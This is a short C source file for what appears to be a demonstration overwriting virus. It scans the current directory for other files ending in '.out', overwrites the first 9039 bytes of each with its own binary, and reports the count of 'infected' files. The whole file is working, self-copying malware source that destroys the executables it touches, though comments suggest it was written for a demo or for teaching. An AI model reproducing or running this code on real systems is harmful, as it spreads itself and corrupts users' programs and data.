#include <stdio.h>
#include <stdio.h>
#include <time.h>
#include <dirent.h>
#include <string.h>

FILE *self,*target;
int a=0;
unsigned long x;
char buff[2048];

int main(int argc, char *argv[])
{
	DIR *d;//directory stream
	struct dirent *dir; //directory entry

	d = opendir(".");//open current directory (ie where this program is running)

	system("clear");//just for the demo

	//open stream to ourselves...
	self = fopen(argv[0], "rb"); //use rb for non-text files (b = binary)

	if(self == NULL) //help with debugging
		puts("SELF can not be opened");

	if(d != NULL) {
		while((dir = readdir(d)) != NULL)
		{
			//only look for binaries...
			if(strstr(dir->d_name,".out") != NULL && strstr(argv[0], dir->d_name) == NULL){
				printf("Mission Complete... Target: %s\n", dir->d_name);

				target = fopen(dir->d_name, "rb+");//open for both reading and writing

				if(target == NULL)
					puts("Failure, could not obtain handle...");
				else {

					int x = 9039;

					while(x > 2048) {
						fread(buff, 2048, 1, self);
						fwrite(buff, 2048, 1, target);
						x -= 2048;
					}

					fread(buff,x,1,self);
					fwrite(buff,x,1,target);
					a++;

					fclose(target);
				}
			}
		}

		fclose(self);
		closedir(d);

		puts("");
		printf("--------------------\n");
		printf("DONE! (Total Files Infected: %d)\n",a);
		puts("");
	}
}